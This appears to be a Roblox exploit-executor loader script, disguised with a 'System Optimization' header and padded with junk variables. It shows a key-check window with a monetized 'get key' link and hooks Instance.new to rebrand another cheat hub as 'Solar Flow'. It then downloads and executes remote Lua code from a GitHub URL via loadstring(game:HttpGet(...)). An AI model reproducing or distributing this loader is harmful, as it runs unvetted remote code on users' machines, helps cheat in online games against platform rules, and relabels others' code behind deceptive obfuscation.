
--// System Optimization v7.40
local RdfTggOA = 86153; -- junk var
local ykgVYbfZ = 98994; -- junk var
local aOTAxYiY = 8924; -- junk var
local gWRppCTR = 13320; -- junk var
local aViOPKSd = 42602; -- junk var
local WFNzwsUO = 74222; -- junk var
local lQNWoRjV = 20528; -- junk var
local hhqsTest = 98097; -- junk var
local srpbPZMv = 80149; -- junk var
local JXPTncqn = 91469; -- junk var
local hYLcscKD = 19924; -- junk var
local TSIozowJ = 530; -- junk var
local YTEFwgkM = 63834; -- junk var
local PVBAfQXI = 84807; -- junk var
local RpZoXaJp = 40404; -- junk var
local kLgMvpZj = 84961; -- junk var
local ZmPGbQdp = 6434; -- junk var
local QvHYyJck = 97193; -- junk var
local tcQneiWj = 52124; -- junk var
local KbHjFxyZ = 30963; -- junk var
local KpgTlQpQ = 15603; -- junk var
local lMudvEpt = 19982; -- junk var

--// MAIN EXECUTION START
task.spawn(function()
    local s, e = pcall(function()
        --[[ Secured by Lamperuz Auto | ID: 7c53b7b423d24f17ba5e6ef6c4c6e5fc ]]
local _k = {108, 97, 109, 112, 101, 114, 117, 122, 49, 50, 51}
local CoreGui = game:GetService("CoreGui")
if CoreGui:FindFirstChild("rGOWAI") then CoreGui["rGOWAI"]:Destroy() end

local rGOWAI = Instance.new("ScreenGui", CoreGui)
rGOWAI.Name = "rGOWAI"
local zVeMqIV = Instance.new("Frame", rGOWAI)
local jQFQCutK = Instance.new("TextBox", zVeMqIV)

zVeMqIV.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
zVeMqIV.BorderSizePixel = 0
zVeMqIV.Position = UDim2.new(0.5, -175, 0.5, -100)
zVeMqIV.Size = UDim2.new(0, 350, 0, 200)
zVeMqIV.Active = true
zVeMqIV.Draggable = true
Instance.new("UICorner", zVeMqIV).CornerRadius = UDim.new(0, 8)

local tit = Instance.new("TextLabel", zVeMqIV)
tit.Size = UDim2.new(1, 0, 0, 45)
tit.BackgroundTransparency = 1
tit.Text = "SECURITY CHECK"
tit.TextColor3 = Color3.new(1,1,1)
tit.Font = Enum.Font.GothamBold
tit.TextSize = 18

jQFQCutK.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
jQFQCutK.Position = UDim2.new(0.1, 0, 0.35, 0)
jQFQCutK.Size = UDim2.new(0.8, 0, 0, 38)
jQFQCutK.PlaceholderText = "Enter Key..."
jQFQCutK.Text = ""
jQFQCutK.TextColor3 = Color3.new(1,1,1)
jQFQCutK.Font = Enum.Font.Gotham
Instance.new("UICorner", jQFQCutK)

local b_log = Instance.new("TextButton", zVeMqIV)
local b_get = Instance.new("TextButton", zVeMqIV)

local function style_btn(b, p, t, c)
    b.Position = p
    b.Size = UDim2.new(0.38, 0, 0, 38)
    b.Text = t
    b.BackgroundColor3 = c
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b)
end

style_btn(b_log, UDim2.new(0.1, 0, 0.65, 0), "LOGIN", Color3.fromRGB(36, 140, 197))
style_btn(b_get, UDim2.new(0.52, 0, 0.65, 0), "GET KEY", Color3.fromRGB(60, 60, 60))

b_get.MouseButton1Click:Connect(function()
    setclipboard("https://link-center.net/2628650/0udtrz0wIh7A")
    b_get.Text = "COPIED"
    task.wait(1.5)
    b_get.Text = "GET KEY"
end)

b_log.MouseButton1Click:Connect(function()
    local inp = jQFQCutK.Text:gsub("%s+", "")
    if #inp ~= #_k then b_log.Text = "BAD KEY" task.wait(1) b_log.Text = "LOGIN" return end
    
    local v = true
    for i=1, #inp do if string.byte(inp, i) ~= _k[i] then v = false end end
    
    if v then
        b_log.Text = "SUCCESS"
        task.wait(0.5)
        rGOWAI:Destroy()
        
        -- ЗАПУСК УНИКАЛИЗАТОРА И ЦЕЛЕВОГО СКРИПТА
        
        -- === [ LAMPERUZ UNIQUEIZER START ] ===
        local MY_NAME = "Solar Flow"
        local ACCENT_COLOR = Color3.fromRGB(36, 140, 197) 
        
        local oldInstanceNew = Instance.new
        
        local function newInstanceHook(class, parent)
            local obj = oldInstanceNew(class, parent)
            task.spawn(function()
                task.wait() 
                -- 1. Подмена текста
                if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                    if #obj.Text > 3 or obj.Text:find("Hub") then
                        if obj.Size.Y.Offset > 15 or obj.Name:find("Title") then
                            obj.Text = MY_NAME
                        end
                    end
                end
                -- 2. Подмена цвета
                if obj:IsA("Frame") or obj:IsA("TextButton") or obj:IsA("ScrollingFrame") then
                    local c = obj.BackgroundColor3
                    if (c.r > 0.1 or c.g > 0.1 or c.b > 0.1) and (c.r < 0.9) then
                        obj.BackgroundColor3 = ACCENT_COLOR
                    end
                end
                -- 3. Подмена обводки
                if obj:IsA("UIStroke") then
                    obj.Color = ACCENT_COLOR
                end
            end)
            return obj
        end
        
        if getgenv then
            getgenv().Instance = {new = newInstanceHook}
        end
        
        -- Запуск целевого скрипта
        local success, err = pcall(function() 
            loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/Z3US/refs/heads/main/main.lua"))() 
        end)
        if not success then warn("Script Load Error: " .. tostring(err)) end
        -- === [ LAMPERUZ UNIQUEIZER END ] ===
    
    else
        b_log.Text = "WRONG"
        task.wait(1)
        b_log.Text = "LOGIN"
    end
end)

    end)
    if not s then warn("Loader Error: " .. tostring(e)) end
end)
--// MAIN EXECUTION END
--// System Optimization v4.79
local cPOXuJJz = 44236; -- junk var
local zTAMaBHp = 83610; -- junk var
local ZwieJQbW = 54283; -- junk var
local OSSBijHq = 61308; -- junk var
local AvkOYLct = 61010; -- junk var
local rhfXJKFm = 93334; -- junk var
local YzHWaKuo = 97228; -- junk var
local MGHFyXWH = 44934; -- junk var
local MbIKpJqo = 71136; -- junk var
local UfjzLkxa = 41400; -- junk var
local xcVVKmaK = 41550; -- junk var
local QrtuoyBS = 53915; -- junk var
local uLlOPuoC = 73010; -- junk var
local pPrLspjo = 86626; -- junk var
local CeTrrXxW = 10628; -- junk var
local ScTKNoLE = 34585; -- junk var
local yIKgaoxf = 89590; -- junk var
local IWqasjPc = 78902; -- junk var
local XgSIntsz = 19962; -- junk var
local KeTJEDQA = 14560; -- junk var
local akdyGAfA = 11224; -- junk var
local JeqIbxHp = 28343; -- junk var
local IuvzubLi = 55694; -- junk var
local HrnZJnkh = 42397; -- junk var
local ZsnJDQIX = 52851; -- junk var
local KWCLMqKw = 3599; -- junk var
local etSFHqvC = 2350; -- junk var
local GhgyLidy = 75222; -- junk var
local ekPBLsHJ = 98446; -- junk var
local DHRzPUAY = 37245; -- junk var
local zxqKsFbD = 98394; -- junk var
local syAsdfSz = 91470; -- junk var

